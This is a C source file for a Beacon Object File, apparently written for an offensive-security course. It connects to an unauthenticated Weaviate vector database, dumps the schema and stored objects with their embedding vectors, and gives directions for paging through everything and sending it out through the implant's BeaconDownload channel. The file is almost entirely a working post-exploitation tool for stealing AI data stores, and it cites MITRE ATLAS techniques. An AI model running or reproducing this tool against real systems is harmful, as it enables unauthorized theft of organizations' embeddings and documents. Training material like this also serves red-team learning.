/*
 * vectorExport.c — Weaviate schema + vector dump via raw socket (OSAI T3).
 * Course: M6.2.1 open Weaviate :8080 (unauth) -> /v1/schema -> export vectors.
 *         ATLAS AML.T0024 / AML.T0025.
 * No curl child. Uses REST /v1/objects?class=...&with_vector=true (simpler than
 * GraphQL). Prints schema + first page; full .npy export should page via `after`
 * and stage to a temp file then BeaconDownload (see LESSONS).
 *
 * args: str ip, int port(default 8080), int limit(default 25)
 */
#include "aibof.h"
#include <winsock2.h>
#include <ws2tcpip.h>

static int http_get(unsigned int hip, int port, const char* path, char* out, int outmax) {
  SOCKET s = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (s == INVALID_SOCKET) return -1;
  struct sockaddr_in sa; xmemset(&sa, 0, sizeof sa); sa.sin_family = AF_INET;
  sa.sin_addr.S_un.S_addr = bs32(hip); sa.sin_port = bs16((u_short)port);
  if (WS2_32$connect(s, (struct sockaddr*)&sa, sizeof sa) != 0) { WS2_32$closesocket(s); return -1; }
  char req[600];
  /* build GET manually (avoid sprintf varargs issues with beacon) */
  int o = 0; const char* g = "GET ";
  for (; *g; g++) req[o++] = *g;
  for (int i = 0; path[i] && o < 400; i++) req[o++] = path[i];
  const char* tail = " HTTP/1.0\r\nHost: x\r\nConnection: close\r\n\r\n";
  for (int i = 0; tail[i] && o < 590; i++) req[o++] = tail[i];
  req[o] = 0;
  WS2_32$send(s, req, o, 0);
  int total = 0;
  while (total < outmax - 1) {
    int r = WS2_32$recv(s, out + total, outmax - 1 - total, 0);
    if (r <= 0) break;
    total += r;
  }
  out[total] = 0;
  WS2_32$closesocket(s);
  return total;
}

void go(char* args, int alen) {
  datap p; BeaconDataParse(&p, args, alen);
  char* ips = BeaconDataExtract(&p, NULL);
  int port = BeaconDataInt(&p);
  int limit = BeaconDataInt(&p);
  if (!ips || !*ips) ips = "127.0.0.1";
  if (port <= 0) port = 8080;
  if (limit <= 0) limit = 25;
  unsigned int hip = parse_ipv4(ips);
  if (!hip) { BeaconPrintf(CALLBACK_ERROR, "bad ip\n"); return; }

  WSADATA wsa;
  if (WS2_32$WSAStartup(MAKEWORD(2,2), &wsa) != 0) { BeaconPrintf(CALLBACK_ERROR, "wsa\n"); return; }

  char* buf = (char*)intAlloc(256 * 1024);
  if (!buf) { WS2_32$WSACleanup(); return; }

  BeaconPrintf(CALLBACK_OUTPUT, "[*] vectorExport %s:%d limit=%d\n", ips, port, limit);
  int n = http_get(hip, port, "/v1/schema", buf, 256 * 1024);
  if (n <= 0) { BeaconPrintf(CALLBACK_ERROR, "schema fetch failed\n"); }
  else { BeaconPrintf(CALLBACK_OUTPUT, "=== /v1/schema (%d bytes) ===\n%s\n", n, buf); }

  /* first page of objects with vectors. class guessed as DocChunk (M6). */
  char path[256];
  const char* pref = "/v1/objects?class=DocChunk&limit=25&with_vector=true";
  int o = 0; for (; pref[o]; o++) path[o] = pref[o]; path[o] = 0;
  n = http_get(hip, port, path, buf, 256 * 1024);
  if (n > 0) {
    BeaconPrintf(CALLBACK_OUTPUT, "=== /v1/objects (%d bytes; page 1) ===\n", n);
    /* print in chunks of 4000 to keep output sane */
    int off = 0;
    while (off < n) { int c = n - off; if (c > 4000) c = 4000; char sv = buf[off+c]; buf[off+c]=0;
      BeaconPrintf(CALLBACK_OUTPUT, "%s", buf+off); buf[off+c]=sv; off += c; }
    BeaconPrintf(CALLBACK_OUTPUT, "\n=== /v1/objects end ===\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[!] paginate with &after=<last uuid>; stage to file + BeaconDownload for .npy (LESSONS).\n");
  } else {
    BeaconPrintf(CALLBACK_ERROR, "objects fetch failed (class name may differ — re-read schema)\n");
  }
  intFree(buf);
  WS2_32$WSACleanup();
  BeaconPrintf(CALLBACK_OUTPUT, "[*] vectorExport done\n");
}